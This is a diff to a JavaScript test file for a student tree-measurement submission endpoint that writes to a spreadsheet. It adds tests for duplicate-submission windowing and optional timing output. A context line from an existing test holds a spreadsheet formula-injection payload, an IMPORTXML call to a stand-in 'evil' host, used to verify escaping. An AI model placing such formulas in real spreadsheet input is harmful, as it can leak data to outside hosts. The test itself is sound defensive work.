@@ -316,6 +316,23 @@ describe('學生送出量測 doPost', () => {
     expect(env.sheets['量測紀錄'].rows).toHaveLength(2);
   });
 
+  it('查重複只看最近 DEDUPE_WINDOW_ROWS 列:窗內的重送仍被擋、不會多寫', () => {
+    const { env, code } = setup();
+    const filler = Array.from({ length: env.sandbox.DEDUPE_WINDOW_ROWS + 50 }, (_, i) => row('A', '2026-01-01T00:00:00.000Z', 'x', 'y', 1, 1, `old${i}`));
+    env.sheets['量測紀錄'].rows.push(...filler);
+    expect(submit(env, measurement({ studentCode: code, clientRecordId: 'fresh' })).status).toBe('ok');
+    const before = env.sheets['量測紀錄'].rows.length;
+    expect(submit(env, measurement({ studentCode: code, clientRecordId: 'fresh' })).duplicate).toBe(true);
+    expect(env.sheets['量測紀錄'].rows).toHaveLength(before);
+  });
+
+  it('預設不附耗時;請求帶 timing:true 才回各階段毫秒數', () => {
+    const { env, code } = setup();
+    expect(submit(env, measurement({ studentCode: code, clientRecordId: 't1' })).ms).toBeUndefined();
+    const timed = submit(env, measurement({ studentCode: code, clientRecordId: 't2', timing: true }));
+    expect(Object.keys(timed.ms).sort()).toEqual(['dedupe', 'lock', 'total', 'verify', 'write']);
+  });
+
   it('樹號以 = 開頭(公式注入)會被加上單引號變純文字', () => {
     const { env, code } = setup();
     submit(env, measurement({ studentCode: code, treeId: '=IMPORTXML("http://evil","//a")' }));
